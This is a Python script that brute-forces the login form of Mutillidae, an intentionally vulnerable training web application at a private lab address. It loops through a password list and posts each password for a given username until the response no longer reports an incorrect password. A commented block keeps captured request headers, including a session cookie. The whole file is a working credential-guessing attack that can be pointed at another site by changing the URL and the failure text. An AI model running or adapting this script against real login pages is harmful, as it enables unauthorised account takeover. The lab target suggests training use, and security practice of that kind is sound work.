import requests
import sys

url = "http://192.168.198.128/mutillidae/index.php?page=login.php"
# headers = {
#     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
#     'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7,cs;q=0.6',
#     'Cache-Control': 'max-age=0',
#     'Connection': 'keep-alive',
#     'Content-Type': 'application/x-www-form-urlencoded',
#     'Cookie': 'showhints=1; PHPSESSID=k27t5i7prh8eppq92nvn0qiov2',
#     'Origin': 'http://128.198.49.198:8102',
#     'Referer': 'http://128.198.49.198:8102/mutillidae/index.php?page=login.php',
#     'Upgrade-Insecure-Requests': '1',
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
# }


username = sys.argv[1]
passlist = sys.argv[2]


with open(passlist, "r") as file:
    for line in file:
        password = line[:-1]

        data = {
            "username": username,
            "password": password,
            "login-php-submit-button": "Login",
        }

        response = requests.post(url, data=data, verify=False)
        # open("temp.html", "w+").write(response.text)
        if "Password incorrect" in response.text:
            print(password, "... FAILED", flush=True)
        else:
            print(password, "... OK", flush=True)
            exit()
